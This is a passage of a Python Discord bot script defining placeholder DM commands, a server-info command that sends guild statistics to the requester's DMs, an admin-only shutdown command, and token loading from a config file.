    await send_dm(ctx, f"DMall command - placeholder (message: {message})")

@bot.command(name='dm')
async def dm(ctx, user: discord.Member, *, message: str):
    """DM a user placeholder"""
    print(f'{Fore.CYAN}[DM] {Fore.WHITE}DM to {user.display_name} by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
    await send_dm(ctx, f"DM command - placeholder (user: {user.mention}, message: {message})")

@bot.command(name='serverinfo')
async def serverinfo(ctx):
    """Get detailed server information"""
    try:
        print(f'{Fore.CYAN}[SERVERINFO] {Fore.WHITE}Server info requested by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

        guild = ctx.guild

        # Delete command message
        try:
            await ctx.message.delete()
        except:
            pass

        # Count channels by type
        text_channels = len(guild.text_channels)
        voice_channels = len(guild.voice_channels)
        categories = len(guild.categories)

        # Create simple embed
        bot_count = len([m for m in guild.members if m.bot])
        human_count = guild.member_count - bot_count

        description = f"""**{guild.name}**
Members: {guild.member_count} ({human_count} humans, {bot_count} bots)
Channels: {text_channels} text, {voice_channels} voice, {categories} categories
Roles: {len(guild.roles)}
Owner: {guild.owner.mention if guild.owner else "Unknown"}
Created: {guild.created_at.strftime("%Y-%m-%d")}"""

        embed = discord.Embed(
            description=description,
            color=discord.Color.blue()
        )

        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)

        # Send to DM
        try:
            await ctx.author.send(embed=embed)
            # Send ephemeral confirmation in channel
            await ctx.send("Server info sent to your DMs!", delete_after=3)
        except discord.Forbidden:
            await ctx.send("I couldn't DM you! Please enable DMs from server members.", delete_after=5)

    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='shutdown')
@commands.has_permissions(administrator=True)
async def shutdown(ctx):
    """Shutdown the bot"""
    try:
        print(f'{Back.RED}{Fore.WHITE}{Style.BRIGHT}[SHUTDOWN] Bot shutdown initiated by {ctx.author.display_name}{Style.RESET_ALL}')

        # Delete command message
        try:
            await ctx.message.delete()
        except:
            pass

        # Send DM confirmation
        try:
            embed = discord.Embed(
                description="Bot shutting down",
                color=discord.Color.red()
            )
            await ctx.author.send(embed=embed)
        except:
            pass

        # Send farewell message in channel
        try:
            await ctx.send("🔴 Bot shutting down...", delete_after=3)
        except:
            pass

        print(f'{Back.RED}{Fore.WHITE}[SHUTDOWN] Bot is now shutting down...{Style.RESET_ALL}')

        # Close the bot
        await bot.close()

    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

# Run the bot
if __name__ == "__main__":
    token = config.get("token")
    if not token:
        print(f'{Fore.RED}Error: Token not found in config.json!{Style.RESET_ALL}')
        print('Please add your bot token to config.json')
        print('Example: {"token": "BOT_TOKEN"}')
    else:
        print(f'{Fore.CYAN}[CONFIG] Bot token loaded from config.json{Style.RESET_ALL}')
        bot.run(token)
